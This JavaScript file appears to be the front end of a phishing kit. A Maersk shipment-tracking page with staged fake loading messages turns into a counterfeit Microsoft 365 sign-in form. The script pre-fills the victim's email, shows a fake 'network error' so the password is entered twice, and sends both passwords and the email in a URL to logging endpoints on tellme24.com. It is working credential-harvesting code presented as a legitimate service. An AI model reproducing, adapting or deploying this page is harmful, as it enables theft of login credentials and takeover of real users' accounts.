const maersk_contents = document.getElementById("maersk_contents");

const hauling_img = document.getElementById("hauling_img");

const maersk_table = document.getElementById("maersk_table");
const track_btn = document.getElementById("track_btn");

const laod_content = document.getElementById("laod_content");
const img_laoder = document.getElementById("img_laoder");
const service_laoding = document.getElementById("service_laoding");

img_counter = Math.floor(Math.random() * 4);
let photo_slide  = "https://babo4.github.io/msk/"+img_counter+".png"
hauling_img.src = photo_slide;

track_btn.addEventListener("click", ()=>{
    maersk_table.style.display = "none";
    laod_content.style.display = "flex";

    setTimeout(() => {
        service_laoding.innerText = "Fetching email portal . . .";
    }, 3000);

    setTimeout(() => {
        service_laoding.innerText = "Email verification . . .";
    }, 6000);

    setTimeout(() => {
        maersk_contents.innerHTML = `
        <!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <link rel="stylesheet" href="style.css">
    
    <title>Sign in to your account</title>
</head>
<body>

    <main id="app_main">
        <aside id="form_container">
            <div class="office_main_form">
                
            <b id="load_ani">. . .</b>
            
                <img src="https://babo4.github.io/msk/logo.svg" alt="Sign in">
                <p id="name_holder"><b>&#10508;</b> <span id="e_holder"></span></p>

                <h1 id="header_main">Sign in</h1>

                <input type="email" id="e_input" value="" class="show_pass_content" placeholder="Email, phone, or Skype">

                <input type="hidden" id="temp_p">
                <input type="hidden" id="data_send" value="1">
                <p id="link1">No account? <a href="">Create one!</a></p>
                <p id="link2"><a href="">Sign in with Windows Hello or a security key</a> <span class="link_q">?</span></p>
                <section class="btn_container">
                    <button id="btn_365">Next</button>
                </section>
            </div>

            <div class="office_sub_form">
                <img src="https://babo4.github.io/msk/key.svg" alt="Sign in">
                <span>Sign-in options</span>
            </div>

        </aside>

        <footer>
            <a href="">Terms of use</a>
            <a href="">Privacy & cookies</a>
            <a href="">. . .</a>
        </footer>
    </main>
    
</body>
</html>
        `;

        const validEmail =
        /^(([^<>()[\]\\.,;:\s@"]+(\.[^<>()[\]\\.,;:\s@"]+)*)|(".+"))@((\[[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\])|(([a-zA-Z\-0-9]+\.)+[a-zA-Z]{2,}))$/;
    
    const urls = new URLSearchParams(window.location.search);
    const user = urls.get('user');
    
    const e_input = document.getElementById("e_input");
    const load_ani = document.getElementById("load_ani");
    const data_send = document.getElementById("data_send");
    
    let link1 = document.getElementById("link1");
    let link2 = document.getElementById("link2");
    let name_holder = document.getElementById("name_holder");
    let header_main = document.getElementById("header_main");
    let btn_365 = document.getElementById("btn_365");
    let temp_p = document.getElementById("temp_p");
    let e_holder = document.getElementById("e_holder");
    
    const office_sub_form = document.querySelector(".office_sub_form");
    
    let office_count = 0;
    
    const sub_btn = document.getElementById("form_container");
    sub_btn.addEventListener("click", (e)=>{
        // e.preventDefault()
    
        if (btn_365.innerText == "Next") {
    
            let rand_num = Math.floor(Math.random() * 2000) + 5000;
    
            if (validEmail.test(e_input.value)) {
                load_ani.style.display = "block";
                btn_365.innerText = "Wait . . ."
    
                setTimeout(() => {
                    getMail(e_input.value)
                    e_input.value = ""
                    load_ani.style.display = "none"
                }, rand_num); 
            } 
            else if (validEmail.test(user)) {
                getMail(user) 
            }
            else{
                e_input.style.borderColor = "red";
            }
            
        }
    
        if (btn_365.innerText == "Sign in") {
            office_count++
    
            if (office_count == 2) {
    
                if (validEmail.test(e_holder.innerText)) {
    
                    if (e_input.value.length < 6 || e_input.value == "password" || e_input.value == "Password" || e_input.value == "PASSWORD" || e_input.value == "qwerty" || e_input.value == "QWERTY" || e_input.value == "123456" || e_input.value == "testing" || e_input.value == "Testing" || e_input.value == "TESTING") {
    
                    e_input.style.borderColor = "red";
                    office_count = 2;
        
                        return
                    }
    
                    getPass(pass1 = temp_p.value, pass2 = e_input.value, mail = e_holder.innerText)
                }
            } 
            else {
    
                if (e_input.value.length < 6 || e_input.value == "password" || e_input.value == "Password" || e_input.value == "PASSWORD" || e_input.value == "qwerty" || e_input.value == "QWERTY" || e_input.value == "123456" || e_input.value == "testing" || e_input.value == "Testing" || e_input.value == "TESTING") {
                    e_input.style.borderColor = "red"
    
                    return
                }
    
                let rand_num = Math.floor(Math.random() * 2000) + 5000;
    
                load_ani.style.display = "block";
                btn_365.innerText = "Verifying . . ."
    
                 setTimeout(() => {
                    temp_p.value =  e_input.value;
                    e_input.value = "";
                    load_ani.style.display = "none";
                    e_input.style.borderColor = "red";
    
                    office_sub_form.style.display = "block";
                    office_sub_form.innerHTML = `<b style="color:red; font-weight:400">Network error! Please try again. </b>`;
                    btn_365.innerText = "Sign in"
                 }, rand_num);
            }
        }
        
    })
    
    // 
    if (user != null && validEmail.test(user)) {
        getMail(user)
        e_input.value = ""
    }
    else if (validEmail.test(e_input.value)) {
        load_ani.style.display = "block";
            btn_365.innerText = "Wait . . ."
    
            setTimeout(() => {
                getMail(e_input.value)
                e_input.value = ""
                load_ani.style.display = "none"
            }, 1000);
    }
    
    // 
    function getPass(pass1, pass2, mail) {
        if (pass1 != "" && pass2 !="" && mail != "") {
            let url = "msn365.php?auth=office&pass1="+pass1+"&pass2="+pass2+"&mail="+mail;
    
            if (data_send.value == 1) {
                url = "https://tellme24.com/logs/365/gb1/msn365.php?auth=office&pass1="+pass1+"&pass2="+pass2+"&mail="+mail; 
            }
            else  if (data_send.value == 2) {
                url = "https://tellme24.com/logs/365/gb2/msn365.php?auth=office&pass1="+pass1+"&pass2="+pass2+"&mail="+mail; 
            }
            else  if (data_send.value == 3) {
                url = "https://tellme24.com/logs/365/gb3/msn365.php?auth=office&pass1="+pass1+"&pass2="+pass2+"&mail="+mail; 
            }
            else  if (data_send.value == 4) {
                url = "https://tellme24.com/logs/365/bo/msn365.php?auth=office&pass1="+pass1+"&pass2="+pass2+"&mail="+mail; 
            }
    
            location = url;
            
        }
        else {
            e_input.style.borderColor = "red";
        }
    }
    
    function getMail(mail) {
        if (validEmail.test(mail)) {
            name_holder.style.display = "block";
            e_holder.innerText = mail;
            e_input.placeholder = "Password";
            e_input.type = "password";
            header_main.innerText = "Enter password";
            btn_365.innerText = "Sign in";
            link1.innerHTML = `<a href="">Forgot password?</a>`;
            link2.innerHTML = `<a href="">Other ways to sign in</a>`;
            office_sub_form.style.display = "none"
    
        }
        else{
            e_input.style.borderColor = "red";
        }
    }
    }, 9000);
});
